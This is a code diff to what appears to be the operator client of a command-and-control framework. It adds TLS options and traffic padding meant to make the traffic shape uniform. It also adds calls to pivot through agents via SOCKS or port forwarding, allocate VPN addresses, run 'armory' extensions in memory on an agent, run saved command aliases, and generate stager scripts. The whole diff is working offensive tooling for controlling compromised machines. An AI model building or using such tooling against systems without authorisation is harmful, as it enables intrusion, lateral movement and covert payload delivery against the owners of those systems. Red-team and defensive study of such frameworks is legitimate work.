@@ -54,6 +54,11 @@ class OperatorClient:
         timeout: float = 15.0,
         on_event: Optional[Callable[[Dict[str, Any]], None]] = None,
         verbose: bool = False,
+        tls: bool = False,
+        tls_ca: str = "",
+        tls_server_name: str = "",
+        tls_cert: str = "",
+        tls_key: str = "",
     ) -> None:
         self.server = server
         self.operator = operator
@@ -61,6 +66,11 @@ class OperatorClient:
         self.timeout = timeout
         self.on_event = on_event
         self.verbose = verbose
+        self.tls = tls
+        self.tls_ca = tls_ca
+        self.tls_server_name = tls_server_name
+        self.tls_cert = tls_cert
+        self.tls_key = tls_key
 
         self._stream: Optional[netio.Stream] = None
         self._session: Optional[session.Session] = None
@@ -85,6 +95,8 @@ class OperatorClient:
         except OSError as exc:
             raise OperatorError(f"connect {self.server}: {exc}") from exc
         sock.settimeout(self.timeout)
+        if self.tls:
+            sock = self._wrap_tls(sock, host)
         self._stream = netio.Stream(sock, timeout=self.timeout)
 
         result = handshake.client_handshake(
@@ -121,6 +133,37 @@ class OperatorClient:
     def __exit__(self, *exc: Any) -> None:
         self.close()
 
+    # -- tls -------------------------------------------------------------
+    def _wrap_tls(self, sock: socket.socket, host: str) -> socket.socket:
+        """Put TLS on the socket.
+
+        The server may ask for a client certificate (mutual TLS): the
+        operator then has to present one, otherwise the handshake fails and
+        the server drops the connection.
+        """
+        import ssl
+
+        ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH, cafile=self.tls_ca or None)
+        ctx.check_hostname = True
+        ctx.verify_mode = ssl.CERT_REQUIRED
+        if self.tls_cert:
+            # Mutual TLS: the server asks for a certificate, so the operator
+            # has to present one.  A missing key file is a configuration
+            # mistake and worth a clear message.
+            if not self.tls_key:
+                raise OperatorError("a client certificate needs a private key (--tls-key)")
+            try:
+                ctx.load_cert_chain(self.tls_cert, self.tls_key)
+            except (OSError, ssl.SSLError) as exc:
+                raise OperatorError(f"client certificate {self.tls_cert} rejected: {exc}") from exc
+        name = self.tls_server_name or host
+        try:
+            return ctx.wrap_socket(sock, server_hostname=name)
+        except ssl.SSLError as exc:
+            raise OperatorError(f"TLS handshake with {name} failed: {exc}") from exc
+        except OSError as exc:
+            raise OperatorError(f"TLS setup failed: {exc}") from exc
+
     # -- rpc -------------------------------------------------------------
     def rpc(self, cmd: str, args: Optional[Dict[str, Any]] = None) -> RpcResult:
         if self._session is None or self._stream is None:
@@ -155,6 +198,10 @@ class OperatorClient:
                 msg_type, body = self._session.decrypt_message(raw)
             except (session.SessionError, ValueError, upk.UpkError):
                 break
+            if msg_type == wire.MsgType.PADDING:
+                # Padding frames carry random bytes and are ignored: they only
+                # make the traffic shape uniform.
+                continue
             if msg_type == wire.MsgType.OP_RESPONSE:
                 rid = body.get("rid")
                 with self._lock:
@@ -309,6 +356,159 @@ class OperatorClient:
         res = self.rpc("agents.sleep", {"id": agent_id, "sleep": sleep, "jitter": jitter})
         if not res.ok:
             raise OperatorError(res.error)
+
+    # -- pivoting -------------------------------------------------------
+    def pivot_list(self) -> List[Dict[str, Any]]:
+        """Every open pivot tunnel and the number of live callback sessions."""
+        res = self.rpc("pivot.list")
+        if not res.ok:
+            raise OperatorError(res.error)
+        return list(res.data.get("tunnels", []))
+
+    def pivot_sessions(self) -> int:
+        """How many agents currently hold a callback session."""
+        res = self.rpc("pivot.list")
+        if not res.ok:
+            raise OperatorError(res.error)
+        return int(res.data.get("sessions", 0))
+
+    def pivot_open(
+        self,
+        agent_id: str,
+        *,
+        mode: str = "socks",
+        host: str = "",
+        port: int = 0,
+        listen: str = "",
+    ) -> Dict[str, Any]:
+        """Open a pivot through an agent.
+
+        ``mode`` is ``socks`` (the client picks the target) or ``forward``
+        (``host``/``port`` are fixed). The reply carries the local address the
+        tunnel listens on.
+        """
+        res = self.rpc(
+            "pivot.open",
+            {
+                "id": agent_id,
+                "mode": mode,
+                "host": host,
+                "port": int(port),
+                "listen": listen,
+            },
+        )
+        if not res.ok:
+            raise OperatorError(res.error)
+        return res.data
+
+    def pivot_close(self, tunnel_id: str) -> None:
+        res = self.rpc("pivot.close", {"stream": tunnel_id})
+        if not res.ok:
+            raise OperatorError(res.error)
+
+    # -- layer-3 tunnel --------------------------------------------------
+    def vpn_status(self) -> Dict[str, Any]:
+        res = self.rpc("vpn.status")
+        if not res.ok:
+            raise OperatorError(res.error)
+        return res.data
+
+    def vpn_peers(self) -> List[Dict[str, Any]]:
+        res = self.rpc("vpn.peers")
+        if not res.ok:
+            raise OperatorError(res.error)
+        return list(res.data.get("peers", []))
+
+    def vpn_allocate(self, agent_id: str) -> str:
+        """Reserve a tunnel address for an agent and return it."""
+        res = self.rpc("vpn.allocate", {"id": agent_id})
+        if not res.ok:
+            raise OperatorError(res.error)
+        return str(res.data.get("address", ""))
+
+    # -- extension store -------------------------------------------------
+    def armory_list(self) -> Dict[str, Any]:
+        res = self.rpc("armory.list")
+        if not res.ok:
+            raise OperatorError(res.error)
+        return res.data
+
+    def armory_install(self, name: str) -> Dict[str, Any]:
+        res = self.rpc("armory.install", {"name": name})
+        if not res.ok:
+            raise OperatorError(res.error)
+        return res.data
+
+    def armory_remove(self, name: str) -> None:
+        res = self.rpc("armory.remove", {"name": name})
+        if not res.ok:
+            raise OperatorError(res.error)
+
+    def armory_run(
+        self,
+        name: str,
+        agent_id: str,
+        args: Optional[Dict[str, Any]] = None,
+    ) -> str:
+        """Run an installed extension in memory on an agent."""
+        res = self.rpc("armory.run", {"name": name, "id": agent_id, "args": args or {}})
+        if not res.ok:
+            raise OperatorError(res.error)
+        return str(res.data.get("task_id", ""))
+
+    # -- command namespace -----------------------------------------------
+    def alias_list(self) -> List[Dict[str, Any]]:
+        res = self.rpc("alias.list")
+        if not res.ok:
+            raise OperatorError(res.error)
+        return list(res.data.get("aliases", []))
+
+    def alias_run(
+        self,
+        name: str,
+        agent_id: str,
+        args: Optional[Dict[str, Any]] = None,
+    ) -> str:
+        """Run a saved command; the server expands it into a task."""
+        res = self.rpc("alias.run", {"name": name, "id": agent_id, "args": args or {}})
+        if not res.ok:
+            raise OperatorError(res.error)
+        return str(res.data.get("task_id", ""))
+
+    # -- team ------------------------------------------------------------
+    def team_sync(self) -> Dict[str, Any]:
+        """One snapshot of the team: agents, operators and the chat log."""
+        res = self.rpc("team.sync")
+        if not res.ok:
+            raise OperatorError(res.error)
+        return res.data
+
+    # -- stagers ---------------------------------------------------------
+    def stager_generate(
+        self,
+        *,
+        platform: str = "windows",
+        transport: str = "tcp",
+        server: str = "",
+        url: str = "",
+        sha256: str = "",
+        agent_id: str = "",
+    ) -> str:
+        """Render a stager script for the requested platform."""
+        res = self.rpc(
+            "stager.generate",
+            {
+                "platform": platform,
+                "transport": transport,
+                "server": server,
+                "url": url,
+                "sha256": sha256,
+                "agent_id": agent_id,
+            },
+        )
+        if not res.ok:
+            raise OperatorError(res.error)
+        return str(res.data.get("stager", ""))
 
     # -- chunked file transfer -------------------------------------------
     def _run_transfer_step(self, agent_id: str, kind: str, args: Dict[str, Any], timeout: float) -> Dict[str, Any]:
